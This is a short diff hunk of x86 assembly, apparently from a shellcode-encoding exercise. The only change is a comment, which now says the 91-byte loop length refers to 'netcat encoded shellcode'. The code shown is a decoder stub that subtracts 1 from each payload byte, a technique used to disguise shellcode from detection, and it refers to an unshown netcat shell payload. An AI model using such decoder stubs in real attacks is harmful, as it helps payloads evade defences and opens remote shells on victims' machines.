@@ -7,7 +7,7 @@ _start:
 InitDecode:
   pop esi                         ; esi is pointing to shellcode entrypoint
   xor ecx, ecx                    ; zero loop counter
-  mov cl, 91                      ; 91d is 5bh (length of netcat shellcode)
+  mov cl, 91                      ; 91d is 5bh (length of netcat encoded shellcode)
 
 Decode:
   sub byte [esi + ecx - 1], 1     ; decode shellcode byte after byte
